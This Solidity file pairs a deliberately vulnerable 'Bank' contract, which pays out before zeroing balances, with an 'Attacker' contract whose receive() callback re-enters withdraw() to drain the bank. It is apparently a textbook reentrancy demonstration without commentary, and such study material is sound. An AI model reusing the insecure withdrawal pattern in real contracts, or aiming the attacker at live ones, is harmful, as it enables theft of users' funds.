// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
contract Bank {
    mapping(address => uint256) public bal;
    function deposit() external payable { bal[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 a = bal[msg.sender];
        (bool ok,) = msg.sender.call{value: a}(""); require(ok);
        bal[msg.sender] = 0;
    }
}
contract Attacker {
    Bank bank;
    constructor(Bank b) payable { bank = b; }
    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
    receive() external payable {
        if (address(bank).balance >= 1 ether) bank.withdraw();
    }
}
